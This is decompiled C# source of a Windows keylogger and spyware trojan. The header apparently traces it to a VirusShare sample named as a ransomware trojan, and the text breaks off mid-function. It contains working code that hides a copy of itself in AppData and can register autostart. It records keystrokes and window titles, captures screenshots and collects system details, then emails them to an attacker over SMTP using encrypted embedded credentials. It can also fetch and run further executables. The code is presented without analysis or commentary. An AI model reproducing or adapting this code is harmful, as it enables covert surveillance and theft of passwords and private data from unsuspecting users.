// Decompiled with JetBrains decompiler
// Type: Form1
// Assembly: SeNz0r, Version=7.38.36.3, Culture=neutral, PublicKeyToken=null
// MVID: 23FF9CFE-2CA5-4E6E-9DC5-019E602A0FCC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-42977ec26b43ffda28855c6f4ab8877f59ebe299.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

[DesignerGenerated]
public class Form1 : Form
{
  private object i;
  private string strin;
  private object keyPressed;
  private int charCount;
  private int lineLimit;
  private object addKey;
  private string msgtitle;
  private string msgb;
  private MessageBoxIcon msgtype;
  private string keyz;
  private string emailz;
  private string port;
  private string smtp;
  private string passwordz;
  private string website;
  private string download;
  private string interval;
  private bool ss;
  private bool dl;
  private bool wb;
  private bool ci;
  private bool su;
  private bool mel;
  private bool msg;
  private Bitmap bmpScreenShot;
  private Graphics gfxScreenshot;
  private IContainer components;
  [AccessedThroughProperty("Timer1")]
  private System.Windows.Forms.Timer _Timer1;
  [AccessedThroughProperty("Timer2")]
  private System.Windows.Forms.Timer _Timer2;
  [AccessedThroughProperty("TextBox1")]
  private TextBox _TextBox1;

  public Form1()
  {
    this.FormClosed += new FormClosedEventHandler(this.Form1_FormClosed);
    this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
    this.Load += new EventHandler(this.Form1_Load);
    this.strin = (string) null;
    this.lineLimit = 69;
    this.InitializeComponent();
  }

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern short GetAsyncKeyState(int vKey);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern short GetKeyState(int nVirtKey);

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  private string GetActiveWindowTitle()
  {
    string lpString = new string(char.MinValue, 100);
    Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  [STAThread]
  public static void Main()
  {
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    Application.Run((Form) new Form1());
  }

  public static string DecryptTripleDES(string sOut, string sKey)
  {
    TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
    MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
    sKey = Form1.ScrambleKey(sKey);
    cryptoServiceProvider1.Key = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(sKey));
    cryptoServiceProvider1.Mode = CipherMode.ECB;
    ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
    byte[] inputBuffer = Convert.FromBase64String(sOut);
    return Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
  }

  private void Form1_Load(object sender, EventArgs e)
  {
    this.keyz = Form1.DecryptTripleDES("2yXIKDKfQXwEmvODFkDJAQ==", Conversions.ToString(987231145));
    this.emailz = Form1.DecryptTripleDES("OGNy7ugJi/2cpFrVbmhlB4Sab4QSgsHH", this.keyz);
    this.passwordz = Form1.DecryptTripleDES("U4UOHEtKFrw=", this.keyz);
    this.website = Form1.DecryptTripleDES("J3ZP6fagomY=", this.keyz);
    this.download = Form1.DecryptTripleDES("J3ZP6fagomY=", this.keyz);
    this.msgtitle = "";
    this.msgb = "";
    this.msgtype = MessageBoxIcon.Exclamation;
    this.port = "587";
    this.interval = Conversions.ToString(300000);
    this.smtp = "smtp.live.com";
    this.ss = true;
    this.dl = false;
    this.wb = false;
    this.ci = true;
    this.su = false;
    this.mel = false;
    this.msg = false;
    if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SeNz0r.exe"))
    {
      if (Operators.CompareString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Application.StartupPath, false) == 0)
      {
        this.Timer1.Interval = Conversions.ToInteger(this.interval);
        this.Timer2.Start();
        this.Timer1.Start();
      }
    }
    else
    {
      string str1 = Conversions.ToString(this.GetRandom(3, 50000));
      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SeNz0r.exe");
      Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SeNz0r.exe");
      FileAttributes fileAttributes = FileAttributes.Hidden;
      System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SeNz0r.exe", fileAttributes);
      if (this.su)
      {
        string name1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        string name2 = "Windows applicaton";
        string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SeNz0r.exe";
        Registry.CurrentUser.OpenSubKey(name1, true).SetValue(name2, (object) str2, RegistryValueKind.String);
      }
      if (this.msg)
      {
        int num = (int) MessageBox.Show(this.msgb, this.msgtitle, MessageBoxButtons.OK, this.msgtype);
      }
      if (this.wb)
        Process.Start(this.website);
      if (this.dl)
      {
        this.DLrun(this.download, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + str1 + ".exe");
        System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + str1 + ".exe", fileAttributes);
      }
      if (this.mel)
        System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
      this.newUser();
    }
    this.Hide();
  }

  public bool getCapslock() => ((uint) Form1.GetKeyState(20) & 1U) > 0U;

  public bool getShift() => Form1.GetAsyncKeyState(16) != (short) 0;

  public bool getControl() => Form1.GetAsyncKeyState(17) != (short) 0;

  private void Form1_FormClosed(object sender, FormClosedEventArgs e)
  {
  }

  private void Form1_FormClosing(object sender, FormClosingEventArgs e)
  {
    if (Operators.CompareString(this.TextBox1.Text, "", false) == 0)
    {
      this.TextBox1.Text = "";
    }
    else
    {
      try
      {
        string str = Conversions.ToString(this.GetRandom(3, 50000));
        MailMessage message = new MailMessage();
        message.From = new MailAddress(this.emailz);
        message.To.Add(this.emailz);
        message.Subject = "[Vulcan " + MyProject.Computer.Name + "]: Program Is Off Now";
        if (this.ss)
        {
          try
          {
            this.bmpScreenShot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            this.gfxScreenshot = Graphics.FromImage((Image) this.bmpScreenShot);
            this.gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            this.bmpScreenShot.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str + ".png");
            Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str + ".png");
            message.Attachments.Add(attachment);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (this.ci)
        {
          message.Body += Environment.NewLine;
          MailMessage mailMessage1 = message;
          mailMessage1.Body = mailMessage1.Body + "IP Addresss: " + this.GetMyIP().ToString();
          message.Body += Environment.NewLine;
          MailMessage mailMessage2 = message;
          mailMessage2.Body = mailMessage2.Body + "OS Version: " + Form1.GenerateOperatingSystem();
          message.Body += Environment.NewLine;
          MailMessage mailMessage3 = message;
          mailMessage3.Body = mailMessage3.Body + "Username: " + Environment.UserName.ToString();
          message.Body += Environment.NewLine;
          MailMessage mailMessage4 = message;
          mailMessage4.Body = mailMessage4.Body + "Computer Name: " + Environment.MachineName.ToString();
          message.Body += Environment.NewLine;
          MailMessage mailMessage5 = message;
          mailMessage5.Body = mailMessage5.Body + "System Root: " + Environment.SystemDirectory.ToString();
          message.Body += Environment.NewLine;
          MailMessage mailMessage6 = message;
          mailMessage6.Body = mailMessage6.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
          message.Body += Environment.NewLine;
          message.Body += "------------------------------------------------";
          message.Body += Environment.NewLine;
        }
        message.Body += this.TextBox1.Text;
        new SmtpClient(this.smtp)
        {
          Port = Conversions.ToInteger(this.port),
          EnableSsl = true,
          Credentials = ((ICredentialsByHost) new NetworkCredential(this.emailz, this.passwordz))
        }.Send(message);
        this.TextBox1.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void newUser()
  {
    try
    {
      string str = Conversions.ToString(this.GetRandom(3, 50000));
      MailMessage message = new MailMessage();
      message.From = new MailAddress(this.emailz);
      message.To.Add(this.emailz);
      message.Subject = "[Vulcan " + MyProject.Computer.Name + "]: New Infection";
      if (this.ss)
      {
        try
        {
          this.bmpScreenShot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
          this.gfxScreenshot = Graphics.FromImage((Image) this.bmpScreenShot);
          this.gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
          this.bmpScreenShot.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str + ".png");
          Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str + ".png");
          message.Attachments.Add(attachment);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (this.ci)
      {
        message.Body += Environment.NewLine;
        MailMessage mailMessage1 = message;
        mailMessage1.Body = mailMessage1.Body + "IP Addresss: " + this.GetMyIP().ToString();
        message.Body += Environment.NewLine;
        MailMessage mailMessage2 = message;
        mailMessage2.Body = mailMessage2.Body + "OS Version: " + Form1.GenerateOperatingSystem();
        message.Body += Environment.NewLine;
        MailMessage mailMessage3 = message;
        mailMessage3.Body = mailMessage3.Body + "Username: " + Environment.UserName.ToString();
        message.Body += Environment.NewLine;
        MailMessage mailMessage4 = message;
        mailMessage4.Body = mailMessage4.Body + "Computer Name: " + Environment.MachineName.ToString();
        message.Body += Environment.NewLine;
        MailMessage mailMessage5 = message;
        mailMessage5.Body = mailMessage5.Body + "System Root: " + Environment.SystemDirectory.ToString();
        message.Body += Environment.NewLine;
        MailMessage mailMessage6 = message;
        mailMessage6.Body = mailMessage6.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
        message.Body += Environment.NewLine;
        message.Body += "------------------------------------------------";
        message.Body += Environment.NewLine;
      }
      message.Body += "New Infection!!!";
      new SmtpClient(this.smtp)
      {
        Port = Conversions.ToInteger(this.port),
        EnableSsl = true,
        Credentials = ((ICredentialsByHost) new NetworkCredential(this.emailz, this.passwordz))
      }.Send(message);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void Timer1_Tick(object sender, EventArgs e)
  {
    if (Operators.CompareString(this.TextBox1.Text, "", false) == 0)
    {
      this.TextBox1.Text = "";
    }
    else
    {
      try
      {
        string str = Conversions.ToString(this.GetRandom(3, 50000));
        MailMessage message = new MailMessage();
        message.From = new MailAddress(this.emailz);
        message.To.Add(this.emailz);
        message.Subject = "[Vulcan " + MyProject.Computer.Name + "]: Cod";
        if (this.ss)
        {
          try
          {
            this.bmpScreenShot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            this.gfxScreenshot = Graphics.FromImage((Image) this.bmpScreenShot);
            this.gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            this.bmpScreenShot.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str + ".png");
            Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str + ".png");
            message.Attachments.Add(attachment);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (this.ci)
        {
          message.Body += Environment.NewLine;
          MailMessage mailMessage1 = message;
          mailMessage1.Body = mailMessage1.Body + "IP Addresss: " + this.GetMyIP().ToString();
          message.Body += Environment.NewLine;
          MailMessage mailMessage2 = message;
          mailMessage2.Body = mailMessage2.Body + "OS Version: " + Form1.GenerateOperatingSystem();
          message.Body += Environment.NewLine;
          MailMessage mailMessage3 = message;
          mailMessage3.Body = mailMessage3.Body + "Username: " + Environment.UserName.ToString();
          message.Body += Environment.NewLine;
          MailMessage mailMessage4 = message;
          mailMessage4.Body = mailMessage4.Body + "Computer Name: " + Environment.MachineName.ToString();
          message.Body += Environment.NewLine;
          MailMessage mailMessage5 = message;
          mailMessage5.Body = mailMessage5.Body + "System Root: " + Environment.SystemDirectory.ToString();
          message.Body += Environment.NewLine;
          MailMessage mailMessage6 = message;
          mailMessage6.Body = mailMessage6.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
          message.Body += Environment.NewLine;
          message.Body += "------------------------------------------------";
          message.Body += Environment.NewLine;
        }
        message.Body += this.TextBox1.Text;
        new SmtpClient(this.smtp)
        {
          Port = Conversions.ToInteger(this.port),
          EnableSsl = true,
          Credentials = ((ICredentialsByHost) new NetworkCredential(this.emailz, this.passwordz))
        }.Send(message);
        this.TextBox1.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void Timer2_Tick(object sender, EventArgs e)
  {
label_0:
    int num1;
    int num2;
    try
    {
      int num3 = 1;
      if (Operators.CompareString(this.strin, this.GetActiveWindowTitle(), false) != 0)
      {
label_1:
        num3 = 2;
        this.TextBox1.Text = this.TextBox1.Text + "\r\n[" + this.GetActiveWindowTitle() + "]\r\n";
      }
      else
        goto label_3;
label_2:
      num3 = 3;
      this.strin = this.GetActiveWindowTitle();
label_3:
      ProjectData.ClearProjectError();
      num1 = 1;
label_4:
      num3 = 6;
      this.keyPressed = (object) Form1.GetAsyncKeyState(13);
label_5:
      num3 = 7;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_8;
label_6:
      num3 = 8;
      this.charCount = 0;
label_7:
      num3 = 9;
      this.addKey = (object) "\r\n";
      goto label_244;
label_8:
      num3 = 12;
      this.keyPressed = (object) Form1.GetAsyncKeyState(17);
label_9:
      num3 = 13;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_12;
label_10:
      num3 = 14;
      this.addKey = (object) "[Ctrl]";
label_11:
      num3 = 15;
      checked { this.charCount += 4; }
      goto label_244;
label_12:
      num3 = 18;
      this.keyPressed = (object) Form1.GetAsyncKeyState(8);
label_13:
      num3 = 19;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_16;
label_14:
      num3 = 20;
      this.addKey = (object) "[Backspace]";
label_15:
      num3 = 21;
      checked { this.charCount += 4; }
      goto label_244;
label_16:
      num3 = 24;
      this.keyPressed = (object) Form1.GetAsyncKeyState(32);
label_17:
      num3 = 25;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_20;
label_18:
      num3 = 26;
      this.addKey = (object) " ";
      goto label_244;
label_20:
      num3 = 30;
      this.keyPressed = (object) Form1.GetAsyncKeyState(186);
label_21:
      num3 = 31;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_27;
label_22:
      num3 = 32;
      if (this.getShift())
        goto label_24;
label_23:
      num3 = 33;
      this.addKey = (object) ";";
      goto label_244;
label_24:
      num3 = 35;
label_25:
      num3 = 36;
      this.addKey = (object) ":";
      goto label_244;
label_27:
      num3 = 41;
      this.keyPressed = (object) Form1.GetAsyncKeyState(187);
label_28:
      num3 = 42;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_34;
label_29:
      num3 = 43;
      if (this.getShift())
        goto label_31;
label_30:
      num3 = 44;
      this.addKey = (object) "=";
      goto label_244;
label_31:
      num3 = 46;
label_32:
      num3 = 47;
      this.addKey = (object) "+";
      goto label_244;
label_34:
      num3 = 52;
      this.keyPressed = (object) Form1.GetAsyncKeyState(188);
label_35:
      num3 = 53;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_41;
label_36:
      num3 = 54;
      if (this.getShift())
        goto label_38;
label_37:
      num3 = 55;
      this.addKey = (object) ",";
      goto label_244;
label_38:
      num3 = 57;
label_39:
      num3 = 58;
      this.addKey = (object) "<";
      goto label_244;
label_41:
      num3 = 63;
      this.keyPressed = (object) Form1.GetAsyncKeyState(189);
label_42:
      num3 = 64;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_48;
label_43:
      num3 = 65;
      if (this.getShift())
        goto label_45;
label_44:
      num3 = 66;
      this.addKey = (object) "-";
      goto label_244;
label_45:
      num3 = 68;
label_46:
      num3 = 69;
      this.addKey = (object) "_";
      goto label_244;
label_48:
      num3 = 74;
      this.keyPressed = (object) Form1.GetAsyncKeyState(190);
label_49:
      num3 = 75;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_55;
label_50:
      num3 = 76;
      if (this.getShift())
        goto label_52;
label_51:
      num3 = 77;
      this.addKey = (object) ".";
      goto label_244;
label_52:
      num3 = 79;
label_53:
      num3 = 80;
      this.addKey = (object) ">";
      goto label_244;
label_55:
      num3 = 85;
      this.keyPressed = (object) Form1.GetAsyncKeyState(191);
label_56:
      num3 = 86;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_62;
label_57:
      num3 = 87;
      if (this.getShift())
        goto label_59;
label_58:
      num3 = 88;
      this.addKey = (object) "/";
      goto label_244;
label_59:
      num3 = 90;
label_60:
      num3 = 91;
      this.addKey = (object) "?";
      goto label_244;
label_62:
      num3 = 96;
      this.keyPressed = (object) Form1.GetAsyncKeyState(192);
label_63:
      num3 = 97;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_69;
label_64:
      num3 = 98;
      if (this.getShift())
        goto label_66;
label_65:
      num3 = 99;
      this.addKey = (object) "`";
      goto label_244;
label_66:
      num3 = 101;
label_67:
      num3 = 102;
      this.addKey = (object) "~";
      goto label_244;
label_69:
      num3 = 107;
      this.keyPressed = (object) Form1.GetAsyncKeyState(96);
label_70:
      num3 = 108;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_76;
label_71:
      num3 = 109;
      if (this.getShift())
        goto label_73;
label_72:
      num3 = 110;
      this.addKey = (object) "0";
      goto label_244;
label_73:
      num3 = 112;
label_74:
      num3 = 113;
      this.addKey = (object) ")";
      goto label_244;
label_76:
      num3 = 118;
      this.keyPressed = (object) Form1.GetAsyncKeyState(97);
label_77:
      num3 = 119;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_83;
label_78:
      num3 = 120;
      if (this.getShift())
        goto label_80;
label_79:
      num3 = 121;
      this.addKey = (object) "1";
      goto label_244;
label_80:
      num3 = 123;
label_81:
      num3 = 124;
      this.addKey = (object) "!";
      goto label_244;
label_83:
      num3 = 129;
      this.keyPressed = (object) Form1.GetAsyncKeyState(98);
label_84:
      num3 = 130;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_90;
label_85:
      num3 = 131;
      if (this.getShift())
        goto label_87;
label_86:
      num3 = 132;
      this.addKey = (object) "2";
      goto label_244;
label_87:
      num3 = 134;
label_88:
      num3 = 135;
      this.addKey = (object) "@";
      goto label_244;
label_90:
      num3 = 140;
      this.keyPressed = (object) Form1.GetAsyncKeyState(99);
label_91:
      num3 = 141;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_97;
label_92:
      num3 = 142;
      if (this.getShift())
        goto label_94;
label_93:
      num3 = 143;
      this.addKey = (object) "3";
      goto label_244;
label_94:
      num3 = 145;
label_95:
      num3 = 146;
      this.addKey = (object) "#";
      goto label_244;
label_97:
      num3 = 151;
      this.keyPressed = (object) Form1.GetAsyncKeyState(100);
label_98:
      num3 = 152;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_104;
label_99:
      num3 = 153;
      if (this.getShift())
        goto label_101;
label_100:
      num3 = 154;
      this.addKey = (object) "4";
      goto label_244;
label_101:
      num3 = 156;
label_102:
      num3 = 157;
      this.addKey = (object) "$";
      goto label_244;
label_104:
      num3 = 162;
      this.keyPressed = (object) Form1.GetAsyncKeyState(101);
label_105:
      num3 = 163;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_111;
label_106:
      num3 = 164;
      if (this.getShift())
        goto label_108;
label_107:
      num3 = 165;
      this.addKey = (object) "5";
      goto label_244;
label_108:
      num3 = 167;
label_109:
      num3 = 168;
      this.addKey = (object) "%";
      goto label_244;
label_111:
      num3 = 173;
      this.keyPressed = (object) Form1.GetAsyncKeyState(102);
label_112:
      num3 = 174;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_118;
label_113:
      num3 = 175;
      if (this.getShift())
        goto label_115;
label_114:
      num3 = 176;
      this.addKey = (object) "6";
      goto label_244;
label_115:
      num3 = 178;
label_116:
      num3 = 179;
      this.addKey = (object) "7";
      goto label_244;
label_118:
      num3 = 184;
      this.keyPressed = (object) Form1.GetAsyncKeyState(103);
label_119:
      num3 = 185;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_125;
label_120:
      num3 = 186;
      if (this.getShift())
        goto label_122;
label_121:
      num3 = 187;
      this.addKey = (object) "7";
      goto label_244;
label_122:
      num3 = 189;
label_123:
      num3 = 190;
      this.addKey = (object) "&";
      goto label_244;
label_125:
      num3 = 195;
      this.keyPressed = (object) Form1.GetAsyncKeyState(104);
label_126:
      num3 = 196;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_132;
label_127:
      num3 = 197;
      if (this.getShift())
        goto label_129;
label_128:
      num3 = 198;
      this.addKey = (object) "8";
      goto label_244;
label_129:
      num3 = 200;
label_130:
      num3 = 201;
      this.addKey = (object) "*";
      goto label_244;
label_132:
      num3 = 206;
      this.keyPressed = (object) Form1.GetAsyncKeyState(105);
label_133:
      num3 = 207;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_139;
label_134:
      num3 = 208;
      if (this.getShift())
        goto label_136;
label_135:
      num3 = 209;
      this.addKey = (object) "9";
      goto label_244;
label_136:
      num3 = 211;
label_137:
      num3 = 212;
      this.addKey = (object) "(";
      goto label_244;
label_139:
      num3 = 217;
      this.keyPressed = (object) Form1.GetAsyncKeyState(106);
label_140:
      num3 = 218;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_146;
label_141:
      num3 = 219;
      if (this.getShift())
        goto label_144;
label_142:
      num3 = 220;
      this.addKey = (object) "*";
label_143:
      num3 = 221;
      checked { ++this.charCount; }
      goto label_244;
label_144:
      num3 = 223;
label_145:
      num3 = 224;
      this.addKey = (object) "";
      goto label_244;
label_146:
      num3 = 228;
      this.keyPressed = (object) Form1.GetAsyncKeyState(107);
label_147:
      num3 = 229;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_153;
label_148:
      num3 = 230;
      if (this.getShift())
        goto label_150;
label_149:
      num3 = 231;
      this.addKey = (object) "+";
      goto label_244;
label_150:
      num3 = 233;
label_151:
      num3 = 234;
      this.addKey = (object) "=";
      goto label_244;
label_153:
      num3 = 239;
      this.keyPressed = (object) Form1.GetAsyncKeyState(108);
label_154:
      num3 = 240;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_156;
label_155:
      num3 = 241;
      this.addKey = (object) "";
      goto label_244;
label_156:
      num3 = 244;
      this.keyPressed = (object) Form1.GetAsyncKeyState(109);
label_157:
      num3 = 245;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_163;
label_158:
      num3 = 246;
      if (this.getShift())
        goto label_160;
label_159:
      num3 = 247;
      this.addKey = (object) "-";
      goto label_244;
label_160:
      num3 = 249;
label_161:
      num3 = 250;
      this.addKey = (object) "_";
      goto label_244;
label_163:
      num3 = (int) byte.MaxValue;
      this.keyPressed = (object) Form1.GetAsyncKeyState(110);
label_164:
      num3 = 256;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_170;
label_165:
      num3 = 257;
      if (this.getShift())
        goto label_167;
label_166:
      num3 = 258;
      this.addKey = (object) ".";
      goto label_244;
label_167:
      num3 = 260;
label_168:
      num3 = 261;
      this.addKey = (object) ">";
      goto label_244;
label_170:
      num3 = 266;
      this.keyPressed = (object) Form1.GetAsyncKeyState(111);
label_171:
      num3 = 267;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_174;
label_172:
      num3 = 268;
      this.addKey = (object) "/";
      goto label_244;
label_174:
      num3 = 272;
      this.keyPressed = (object) Form1.GetAsyncKeyState(2);
label_175:
      num3 = 273;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_181;
label_176:
      num3 = 274;
      if (this.getShift())
        goto label_178;
label_177:
      num3 = 275;
      this.addKey = (object) "/";
      goto label_244;
label_178:
      num3 = 277;
label_179:
      num3 = 278;
      this.addKey = (object) "?";
      goto label_244;
label_181:
      num3 = 283;
      this.keyPressed = (object) Form1.GetAsyncKeyState(220);
label_182:
      num3 = 284;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_188;
label_183:
      num3 = 285;
      if (this.getShift())
        goto label_185;
label_184:
      num3 = 286;
      this.addKey = (object) "\\";
      goto label_244;
label_185:
      num3 = 288;
label_186:
      num3 = 289;
      this.addKey = (object) "|";
      goto label_244;
label_188:
      num3 = 294;
      this.keyPressed = (object) Form1.GetAsyncKeyState(222);
label_189:
      num3 = 295;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_195;
label_190:
      num3 = 296;
      if (this.getShift())
        goto label_192;
label_191:
      num3 = 297;
      this.addKey = (object) "'";
      goto label_244;
label_192:
      num3 = 299;
label_193:
      num3 = 300;
      this.addKey = (object) '"';
      goto label_244;
label_195:
      num3 = 305;
      this.keyPressed = (object) Form1.GetAsyncKeyState(221);
label_196:
      num3 = 306;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_202;
label_197:
      num3 = 307;
      if (this.getShift())
        goto label_199;
label_198:
      num3 = 308;
      this.addKey = (object) "]";
      goto label_244;
label_199:
      num3 = 310;
label_200:
      num3 = 311;
      this.addKey = (object) "}";
      goto label_244;
label_202:
      num3 = 316;
      this.keyPressed = (object) Form1.GetAsyncKeyState(219);
label_203:
      num3 = 317;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_209;
label_204:
      num3 = 318;
      if (this.getShift())
        goto label_206;
label_205:
      num3 = 319;
      this.addKey = (object) "[";
      goto label_244;
label_206:
      num3 = 321;
label_207:
      num3 = 322;
      this.addKey = (object) "{";
      goto label_244;
label_209:
      num3 = 327;
      object LoopForResult1;
      if (!ObjectFlowControl.ForLoopControl.ForLoopInitObj(this.i, (object) 48, (object) 57, (object) 1, ref LoopForResult1, ref this.i))
        goto label_228;
label_210:
      num3 = 328;
      this.keyPressed = (object) Form1.GetAsyncKeyState(Conversions.ToInteger(this.i));
label_211:
      num3 = 329;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_227;
label_212:
      num3 = 330;
      if (!this.getShift())
        goto label_224;
label_213:
      num3 = 331;
      switch (Conversion.Val(Strings.Chr(Conversions.ToInteger(this.i))))
      {
        case 0:
          goto label_223;
        case 1:
          break;
        case 2:
          goto label_215;
        case 3:
          goto label_216;
        case 4:
          goto label_217;
        case 5:
          goto label_218;
        case 6:
          goto label_219;
        case 7:
          goto label_220;
        case 8:
          goto label_221;
        case 9:
          goto label_222;
        default:
          goto label_244;
      }
label_214:
      num3 = 335;
      this.addKey = (object) "!";
      goto label_244;
label_215:
      num3 = 338;
      this.addKey = (object) "@";
      goto label_244;
label_216:
      num3 = 341;
      this.addKey = (object) "#";
      goto label_244;
label_217:
      num3 = 344;
      this.addKey = (object) "$";
      goto label_244;
label_218:
      num3 = 347;
      this.addKey = (object) "%";
      goto label_244;
label_219:
      num3 = 350;
      this.addKey = (object) "^";
      goto label_244;
label_220:
      num3 = 353;
      this.addKey = (object) "&";
      goto label_244;
label_221:
      num3 = 356;
